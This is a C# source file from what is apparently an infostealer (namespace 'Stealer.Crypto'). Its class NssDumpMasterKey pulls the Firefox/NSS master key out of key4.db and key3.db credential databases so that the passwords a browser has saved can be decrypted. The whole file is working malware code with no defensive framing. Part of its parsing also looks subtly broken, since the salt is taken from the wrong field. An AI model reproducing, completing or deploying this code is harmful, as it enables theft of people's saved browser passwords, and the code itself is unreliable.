using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using Stealer.Utils;

namespace Stealer.Crypto
{
    public static class NssDumpMasterKey
    {
        public static byte[] Key4Database(string path)
        {
            Asn1Der asn1Der = new Asn1Der();
            
            try
            {
                var parser = SQLiteParser.ReadTable(path, "metaData");
                if (parser == null)
                    return null;

                byte[] globalSalt = null;
                byte[] bytes2 = null;
                
                // Find password entry
                for (int i = 0; i < parser.GetRowCount(); i++)
                {
                    string item1 = parser.GetValue(i, 0);
                    if (item1 == "password")
                    {
                        string item2 = parser.GetValue(i, 1);
                        globalSalt = Encoding.UTF8.GetBytes(item1);
                        bytes2 = Encoding.UTF8.GetBytes(item2);
                        break;
                    }
                }

                if (globalSalt == null || bytes2 == null || globalSalt.Length < 1 || bytes2.Length < 1)
                    return null;

                Asn1DerObject asn1DerObject = asn1Der.Parse(bytes2);
                string text = asn1DerObject.ToString();

                if (text == null)
                    return null;

                if (text.Contains("2A864886F70D010C050103"))
                {
                    // TripleDES path
                    byte[] array2 = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
                    byte[] array4 = asn1DerObject.Objects[0]?.Objects[1]?.Data;

                    if (array2 == null || array4 == null)
                        return null;

                    byte[] bytes3 = new TripleDes(array4, globalSalt, new byte[0], array2).Compute();

                    if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes3).StartsWith("password-check"))
                        return null;
                }
                else if (text.Contains("2A864886F70D01050D"))
                {
                    // PBE path
                    byte[] array6 = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
                    byte[] array8 = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[2]?.Objects[1]?.Data;
                    byte[] array10 = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[3]?.Data;

                    if (array6 == null || array8 == null || array10 == null)
                        return null;

                    byte[] bytes4 = new PBE(array10, globalSalt, new byte[0], array6, array8).Compute();

                    if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes4).StartsWith("password-check"))
                        return null;
                }
                else
                {
                    return null;
                }

                // Get master key from nssPrivate
                var parser2 = SQLiteParser.ReadTable(path, "nssPrivate");
                if (parser2 == null || parser2.GetRowCount() == 0)
                    return null;

                string a11 = parser2.GetValue(0, 0);
                if (string.IsNullOrEmpty(a11))
                    return null;

                byte[] bytes5 = Encoding.UTF8.GetBytes(a11);
                Asn1DerObject asn1DerObject23 = asn1Der.Parse(bytes5);

                byte[] data = asn1DerObject23.Objects[0].Objects[0].Objects[1].Objects[0].Objects[1].Objects[0].Data;
                byte[] data2 = asn1DerObject23.Objects[0].Objects[0].Objects[1].Objects[2].Objects[1].Data;
                byte[] sourceArray = new PBE(asn1DerObject23.Objects[0].Objects[0].Objects[1].Objects[3].Data, globalSalt, new byte[0], data, data2).Compute();

                byte[] array11 = new byte[24];
                Array.Copy(sourceArray, array11, array11.Length);

                return array11;
            }
            catch
            {
                return null;
            }
        }

        public static byte[] Key3Database(string path)
        {
            try
            {
                byte[] array = File.ReadAllBytes(path);
                if (array == null)
                    return null;

                Asn1Der asn1Der = new Asn1Der();
                BerkeleyDB berkeleyDB = new BerkeleyDB(array);

                string text = berkeleyDB.Keys.Where(p => p.Key.Equals("password-check")).Select(p => p.Value).FirstOrDefault();
                if (text == null)
                    return null;

                text = text.Replace("-", null);
                int num = int.Parse(text.Substring(2, 2), NumberStyles.HexNumber) * 2;
                string hexString = text.Substring(6, num);
                int num2 = text.Length - (6 + num + 36);
                string hexString2 = text.Substring(6 + num + 4 + num2);

                string text2 = berkeleyDB.Keys.Where(p => p.Key.Equals("global-salt")).Select(p => p.Value).FirstOrDefault();
                if (text2 == null)
                    return null;

                text2 = text2.Replace("-", null);
                TripleDes tripleDes = new TripleDes(HexToBytes(text2), Encoding.ASCII.GetBytes(""), HexToBytes(hexString));
                tripleDes.ComputeVoid();

                if (!TripleDes.DecryptStringDesCbc(tripleDes.Key, tripleDes.Vector, HexToBytes(hexString2)).StartsWith("password-check"))
                    return null;

                string text3 = berkeleyDB.Keys.Where(p => !p.Key.Equals("global-salt") && !p.Key.Equals("Version") && !p.Key.Equals("password-check")).Select(p => p.Value).FirstOrDefault();
                if (text3 == null)
                    return null;

                text3 = text3.Replace("-", "");
                Asn1DerObject asn1DerObject = asn1Der.Parse(HexToBytes(text3));

                TripleDes tripleDes2 = new TripleDes(HexToBytes(text2), Encoding.ASCII.GetBytes(""), asn1DerObject.Objects[0].Objects[0].Objects[1].Objects[0].Data);
                tripleDes2.ComputeVoid();

                byte[] toParse = TripleDes.DecryptByteDesCbc(tripleDes2.Key, tripleDes2.Vector, asn1DerObject.Objects[0].Objects[1].Data);
                Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse);
                Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.Objects[0].Objects[2].Data);

                byte[] array2 = new byte[24];
                if (asn1DerObject3.Objects[0].Objects[3].Data.Length > 24)
                {
                    Array.Copy(asn1DerObject3.Objects[0].Objects[3].Data, asn1DerObject3.Objects[0].Objects[3].Data.Length - 24, array2, 0, 24);
                }
                else
                {
                    array2 = asn1DerObject3.Objects[0].Objects[3].Data;
                }

                return array2;
            }
            catch
            {
                return null;
            }
        }

        public static byte[] HexToBytes(string hexString)
        {
            if (hexString.Length % 2 != 0)
                return null;

            byte[] array = new byte[hexString.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                string s = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        }
    }
}
